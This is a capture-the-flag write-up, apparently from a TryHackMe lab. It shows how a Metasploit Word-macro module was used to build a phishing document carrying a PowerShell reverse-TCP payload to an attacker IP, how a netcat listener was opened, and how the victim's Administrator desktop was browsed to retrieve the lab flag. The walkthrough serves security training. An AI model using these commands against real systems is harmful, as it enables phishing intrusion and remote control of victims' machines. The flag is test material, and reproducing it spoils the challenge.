# 🎯 **Challenge Writeup: Word File Payload and Reverse Shell Access** 💻🔗  

This challenge was both fun and frustrating, making me bang my head against the wall multiple times! 🧱

---

### 📚 **Step 1: Understanding the Challenge**  
Since we needed to fit a payload inside a Word file, I explored various methods. After trying a few wrong approaches, I discovered that `msfconsole` has a specific module for creating Word-based payloads.

---

### 🛠 **Step 2: Creating the Payload with msfconsole**  
We used the following commands to create a malicious Word file payload:  

```bash
use exploit/multi/fileformat/office_word_macro  
set PAYLOAD payload/windows/powershell_reverse_tcp  
set LHOST 10.17.19.178  
set LPORT 4444  
run  
```  

- **LHOST:** This is my **OpenVPN IP** (as I was connected via `tun0` on WSL).  
- **LPORT:** Any port I wanted to listen on (I chose port `4444`).  

---

### 🔊 **Step 3: Deploying the Payload and Starting Listener**  
After creating and submitting the payload to the victim, I opened a listener on port 4444:  

```bash
nc -lvnp 4444  
```  

💡 **Success!** I got a reverse shell connection to the victim's PC! 🎉  

---

### 🔍 **Step 4: Searching for the Flag**  
Once connected, I explored the victim's desktop:  

```bash
ls C:\Users\Administrator\Desktop\*  
```  

🗂 **Output:**  
```  
  Directory: C:\Users\Administrator\Desktop  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website  
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website  
-a----         3/1/2025   5:27 PM             27 flag.txt  
```  

---

### 🏁 **Step 5: Retrieving the Flag**  
I found the `flag.txt` file, read it, and retrieved the flag:  

```
flag:  
THM{gh0st_ph1sh1ng_exp0s3d}  
```

---
